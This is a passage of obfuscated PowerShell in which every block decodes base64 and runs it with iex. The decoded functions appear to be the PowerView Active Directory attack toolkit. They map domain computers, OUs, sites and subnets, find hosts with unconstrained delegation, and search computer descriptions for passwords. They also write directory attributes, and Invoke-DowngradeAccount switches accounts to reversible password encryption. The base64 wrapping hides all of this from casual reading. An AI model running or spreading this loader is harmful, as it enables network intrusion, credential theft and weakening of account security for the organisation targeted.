VswXQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtRGVidWcgIkVycm9yIGluIGJ1aWxkaW5nIEdVSUQgbWFwOiAkXyIKICAgICAgICB9CiAgICB9CiAgICAkR1VJRHMKfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldENvbXB1dGVyIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICcqJywKICAgICAgICBbU3RyaW5nXQogICAgICAgICRTUE4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3BlcmF0aW5nU3lzdGVtLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZpY2VQYWNrLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZpbHRlciwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRQcmludGVycywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRQaW5nLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZ1bGxEYXRhLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEFEU3BhdGgsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVW5jb25zdHJhaW5lZCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIGJlZ2luIHsKICAgICAgICAkQ29tcFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtQURTcGF0aCAkQURTcGF0aCAtUGFnZVNpemUgJFBhZ2VTaXplCiAgICB9CiAgICBwcm9jZXNzIHsKICAgICAgICBpZiAoJENvbXBTZWFyY2hlcikgewogICAgICAgICAgICBpZigkVW5jb25zdHJhaW5lZCkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBmb3IgdW5jb25zdHJhaW5lZCBkZWxlZ2F0aW9uIgogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj01MjQyODgpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRQcmludGVycykgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2VhcmNoaW5nIGZvciBwcmludGVycyIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihvYmplY3RDYXRlZ29yeT1wcmludFF1ZXVlKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkU1BOKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZWFyY2hpbmcgZm9yIGNvbXB1dGVycyB3aXRoIFNQTjogJFNQTiIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIihzZXJ2aWNlUHJpbmNpcGFsTmFtZT0kU1BOKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBpZigkT3BlcmF0aW5nU3lzdGVtKSB7CiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIob3BlcmF0aW5nc3lzdGVtPSRPcGVyYXRpbmdTeXN0ZW0pIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRTZXJ2aWNlUGFjaykgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKG9wZXJhdGluZ3N5c3RlbXNlcnZpY2VwYWNrPSRTZXJ2aWNlUGFjaykiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJENvbXBTZWFyY2hlci5maWx0ZXIgPSAiKCYoc0FNQWNjb3VudFR5cGU9ODA1MzA2MzY5KShkbnNob3N0bmFtZT0kQ29tcHV0ZXJOYW1lKSRGaWx0ZXIpIgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJENvbXBTZWFyY2hlci5GaW5kQWxsKCkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkVXAgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgIGlmKCRQaW5nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkXy5wcm9wZXJ0aWVzLmRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmKCRVcCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEZ1bGxEYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5wcm9wZXJ0aWVzLmRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiRXJyb3I6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUFET2JqZWN0IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU0lELAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2FtQWNjb3VudE5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQURTcGF0aCwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRGaWx0ZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmV0dXJuUmF3LAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYoJFNJRCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJE5hbWUgPSBDb252ZXJ0LVNpZFRvTmFtZSAkU0lECiAgICAgICAgICAgICAgICBpZigkTmFtZSkgewogICAgICAgICAgICAgICAgICAgICRDYW5vbmljYWwgPSBDb252ZXJ0LU5UNHRvQ2Fub25pY2FsIC1PYmplY3ROYW1lICROYW1lCiAgICAgICAgICAgICAgICAgICAgaWYoJENhbm9uaWNhbCkgewogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluID0gJENhbm9uaWNhbC5zcGxpdCgiLyIpWzBdCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJFcnJvciByZXNvbHZpbmcgU0lEICckU0lEJyIKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIHJlc29sdmluZyBTSUQgJyRTSUQnIDogJF8iCiAgICAgICAgICAgICAgICByZXR1cm4gJE51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkT2JqZWN0U2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1BRFNwYXRoICRBRFNwYXRoIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgICAgICBpZigkT2JqZWN0U2VhcmNoZXIpIHsKICAgICAgICAgICAgaWYoJFNJRCkgewogICAgICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyLmZpbHRlciA9ICIoJihvYmplY3RzaWQ9JFNJRCkkRmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYoJE5hbWUpIHsKICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlci5maWx0ZXIgPSAiKCYobmFtZT0kTmFtZSkkRmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYoJFNhbUFjY291bnROYW1lKSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXIuZmlsdGVyID0gIigmKHNhbUFjY291bnROYW1lPSRTYW1BY2NvdW50TmFtZSkkRmlsdGVyKSIKICAgICAgICAgICAgfQogICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXIuRmluZEFsbCgpIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZigkUmV0dXJuUmF3KSB7CiAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gU2V0LUFET2JqZWN0IHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU0lELAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2FtQWNjb3VudE5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRmlsdGVyLAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFByb3BlcnR5TmFtZSwKICAgICAgICAkUHJvcGVydHlWYWx1ZSwKICAgICAgICBbSW50XQogICAgICAgICRQcm9wZXJ0eVhvclZhbHVlLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENsZWFyVmFsdWUsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICAkQXJndW1lbnRzID0gQHsKICAgICAgICAnU0lEJyA9ICRTSUQKICAgICAgICAnTmFtZScgPSAkTmFtZQogICAgICAgICdTYW1BY2NvdW50TmFtZScgPSAkU2FtQWNjb3VudE5hbWUKICAgICAgICAnRG9tYWluJyA9ICREb21haW4KICAgICAgICAnRG9tYWluQ29udHJvbGxlcicgPSAkRG9tYWluQ29udHJvbGxlcgogICAgICAgICdGaWx0ZXInID0gJEZpbHRlcgogICAgICAgICdQYWdlU2l6ZScgPSAkUGFnZVNpemUKICAgIH0KICAgICRSYXdPYmplY3QgPSBHZXQtQURPYmplY3QgLVJldHVyblJhdyBAQXJndW1lbnRzCiAgICB0cnkgewogICAgICAgICRFbnRyeSA9ICRSYXdPYmplY3QuR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgIGlmKCRDbGVhclZhbHVlKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNsZWFyaW5nIHZhbHVlIgogICAgICAgICAgICAkRW50cnkuJFByb3BlcnR5TmFtZS5jbGVhcigpCiAgICAgICAgICAgICRFbnRyeS5jb21taXRjaGFuZ2VzKCkKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRQcm9wZXJ0eVhvclZhbHVlKSB7CiAgICAgICAgICAgICRUeXBlTmFtZSA9ICRFbnRyeS4kUHJvcGVydHlOYW1lWzBdLkdldFR5cGUoKS5uYW1lCiAgICAgICAgICAgICRQcm9wZXJ0eVZhbHVlID0gJCgkRW50cnkuJFByb3BlcnR5TmFtZSkgLWJ4b3IgJFByb3BlcnR5WG9yVmFsdWUgCiAgICAgICAgICAgICRFbnRyeS4kUHJvcGVydHlOYW1lID0gJFByb3BlcnR5VmFsdWUgLWFzICRUeXBlTmFtZSAgICAgICAKICAgICAgICAgICAgJEVudHJ5LmNvbW1pdGNoYW5nZXMoKSAgICAgCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRW50cnkucHV0KCRQcm9wZXJ0eU5hbWUsICRQcm9wZXJ0eVZhbHVlKQogICAgICAgICAgICAkRW50cnkuc2V0aW5mbygpCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggewogICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIHNldHRpbmcgcHJvcGVydHkgJFByb3BlcnR5TmFtZSB0byB2YWx1ZSAnJFByb3BlcnR5VmFsdWUnIGZvciBvYmplY3QgJCgkUmF3T2JqZWN0LlByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpIDogJF8iCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLURvd25ncmFkZUFjY291bnQgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNhbUFjY291bnROYW1lLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE5hbWUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRmlsdGVyLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlcGFpcgogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgJEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdTYW1BY2NvdW50TmFtZScgPSAkU2FtQWNjb3VudE5hbWUKICAgICAgICAgICAgJ05hbWUnID0gJE5hbWUKICAgICAgICAgICAgJ0RvbWFpbicgPSAkRG9tYWluCiAgICAgICAgICAgICdEb21haW5Db250cm9sbGVyJyA9ICREb21haW5Db250cm9sbGVyCiAgICAgICAgICAgICdGaWx0ZXInID0gJEZpbHRlcgogICAgICAgIH0KICAgICAgICAkVUFDVmFsdWVzID0gR2V0LUFET2JqZWN0IEBBcmd1bWVudHMgfCBzZWxlY3QgdXNlcmFjY291bnRjb250cm9sIHwgQ29udmVydEZyb20tVUFDVmFsdWUKICAgICAgICBpZigkUmVwYWlyKSB7CiAgICAgICAgICAgIGlmKCRVQUNWYWx1ZXMuS2V5cyAtY29udGFpbnMgIkVOQ1JZUFRFRF9URVhUX1BXRF9BTExPV0VEIikgewogICAgICAgICAgICAgICAgU2V0LUFET2JqZWN0IEBBcmd1bWVudHMgLVByb3BlcnR5TmFtZSB1c2VyYWNjb3VudGNvbnRyb2wgLVByb3BlcnR5WG9yVmFsdWUgMTI4CiAgICAgICAgICAgIH0KICAgICAgICAgICAgU2V0LUFET2JqZWN0IEBBcmd1bWVudHMgLVByb3BlcnR5TmFtZSBwd2RsYXN0c2V0IC1Qcm9wZXJ0eVZhbHVlIC0xCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZigkVUFDVmFsdWVzLktleXMgLWNvbnRhaW5zICJET05UX0VYUElSRV9QQVNTV09SRCIpIHsKICAgICAgICAgICAgICAgIFNldC1BRE9iamVjdCBAQXJndW1lbnRzIC1Qcm9wZXJ0eU5hbWUgdXNlcmFjY291bnRjb250cm9sIC1Qcm9wZXJ0eVhvclZhbHVlIDY1NTM2CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJFVBQ1ZhbHVlcy5LZXlzIC1ub3Rjb250YWlucyAiRU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQiKSB7CiAgICAgICAgICAgICAgICBTZXQtQURPYmplY3QgQEFyZ3VtZW50cyAtUHJvcGVydHlOYW1lIHVzZXJhY2NvdW50Y29udHJvbCAtUHJvcGVydHlYb3JWYWx1ZSAxMjgKICAgICAgICAgICAgfQogICAgICAgICAgICBTZXQtQURPYmplY3QgQEFyZ3VtZW50cyAtUHJvcGVydHlOYW1lIHB3ZGxhc3RzZXQgLVByb3BlcnR5VmFsdWUgMAogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUNvbXB1dGVyUHJvcGVydHkgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIGlmKCRQcm9wZXJ0aWVzKSB7CiAgICAgICAgJFByb3BlcnRpZXMgPSAsIm5hbWUiICsgJFByb3BlcnRpZXMgfCBTb3J0LU9iamVjdCAtVW5pcXVlCiAgICAgICAgR2V0LU5ldENvbXB1dGVyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtRnVsbERhdGEgLVBhZ2VTaXplICRQYWdlU2l6ZSB8IFNlbGVjdC1PYmplY3QgLVByb3BlcnR5ICRQcm9wZXJ0aWVzCiAgICB9CiAgICBlbHNlIHsKICAgICAgICBHZXQtTmV0Q29tcHV0ZXIgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIC1GdWxsRGF0YSAtUGFnZVNpemUgJFBhZ2VTaXplIHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgMSB8IEdldC1NZW1iZXIgLU1lbWJlclR5cGUgKlByb3BlcnR5IHwgU2VsZWN0LU9iamVjdCAtUHJvcGVydHkgIk5hbWUiCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Db21wdXRlckZpZWxkIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtBbGlhcygnVGVybScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFRlcm0gPSAncGFzcycsCiAgICAgICAgW0FsaWFzKCdGaWVsZCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEZpZWxkID0gJ2Rlc2NyaXB0aW9uJywKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwYXRoLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW5Db250cm9sbGVyLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwMDApXSAKICAgICAgICBbSW50XQogICAgICAgICRQYWdlU2l6ZSA9IDIwMAogICAgKQogICAgcHJvY2VzcyB7CiAgICAgICAgR2V0LU5ldENvbXB1dGVyIC1BRFNwYXRoICRBRFNwYXRoIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtRnVsbERhdGEgLUZpbHRlciAiKCRTZWFyY2hGaWVsZD0qJFNlYXJjaFRlcm0qKSIgLVBhZ2VTaXplICRQYWdlU2l6ZSB8IFNlbGVjdC1PYmplY3Qgc2FtYWNjb3VudG5hbWUsJFNlYXJjaEZpZWxkCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldE9VIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT1VOYW1lID0gJyonLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdVSUQsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQURTcGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRGdWxsRGF0YSwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLDEwMDAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkUGFnZVNpemUgPSAyMDAKICAgICkKICAgIGJlZ2luIHsKICAgICAgICAkT1VTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUFEU3BhdGggJEFEU3BhdGggLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYgKCRPVVNlYXJjaGVyKSB7CiAgICAgICAgICAgIGlmICgkR1VJRCkgewogICAgICAgICAgICAgICAgJE9VU2VhcmNoZXIuZmlsdGVyPSIoJihvYmplY3RDYXRlZ29yeT1vcmdhbml6YXRpb25hbFVuaXQpKG5hbWU9JE9VTmFtZSkoZ3BsaW5rPSokR1VJRCopKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRPVVNlYXJjaGVyLmZpbHRlcj0iKCYob2JqZWN0Q2F0ZWdvcnk9b3JnYW5pemF0aW9uYWxVbml0KShuYW1lPSRPVU5hbWUpKSIKICAgICAgICAgICAgfQogICAgICAgICAgICAkT1VTZWFyY2hlci5GaW5kQWxsKCkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkRnVsbERhdGEpIHsKICAgICAgICAgICAgICAgICAgICBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsgCiAgICAgICAgICAgICAgICAgICAgJF8ucHJvcGVydGllcy5hZHNwYXRoCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFNpdGUgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTaXRlTmFtZSA9ICIqIiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluQ29udHJvbGxlciwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwYXRoLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdVSUQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRnVsbERhdGEsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgJFNpdGVTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciAtQURTcGF0aCAkQURTcGF0aCAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUFEU3ByZWZpeCAiQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvbiIgLVBhZ2VTaXplICRQYWdlU2l6ZQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYoJFNpdGVTZWFyY2hlcikgewogICAgICAgICAgICBpZiAoJEdVSUQpIHsKICAgICAgICAgICAgICAgICRTaXRlU2VhcmNoZXIuZmlsdGVyPSIoJihvYmplY3RDYXRlZ29yeT1zaXRlKShuYW1lPSRTaXRlTmFtZSkoZ3BsaW5rPSokR1VJRCopKSIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRTaXRlU2VhcmNoZXIuZmlsdGVyPSIoJihvYmplY3RDYXRlZ29yeT1zaXRlKShuYW1lPSRTaXRlTmFtZSkpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkU2l0ZVNlYXJjaGVyLkZpbmRBbGwoKSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmICgkRnVsbERhdGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJF8ucHJvcGVydGllcy5uYW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgJF8KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFN1Ym5ldCB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNpdGVOYW1lID0gIioiLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbU3RyaW5nXQogICAgICAgICRBRFNwYXRoLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRnVsbERhdGEsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwxMDAwMCldIAogICAgICAgIFtJbnRdCiAgICAgICAgJFBhZ2VTaXplID0gMjAwCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgJFN1Ym5ldFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtQURTcGF0aCAkQURTcGF0aCAtQURTcHJlZml4ICJDTj1TdWJuZXRzLENOPVNpdGVzLENOPUNvbmZpZ3VyYXRpb24iIC1QYWdlU2l6ZSAkUGFnZVNpemUKICAgIH0KICAgIHByb2Nlc3MgewogICAgICAgIGlmKCRTdWJuZXRTZWFyY2hlcikgewogICAgICAgICAgICAkU3VibmV0U2VhcmNoZXIuZmlsdGVyPSIoJihvYmplY3RDYXRlZ29yeT1zdWJuZXQpKSIKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRTdWJuZXRTZWFyY2hlci5GaW5kQWxsKCkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJEZ1bGxEYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMgfCBXaGVyZS1PYmplY3QgeyAkXy5zaXRlb2JqZWN0IC1t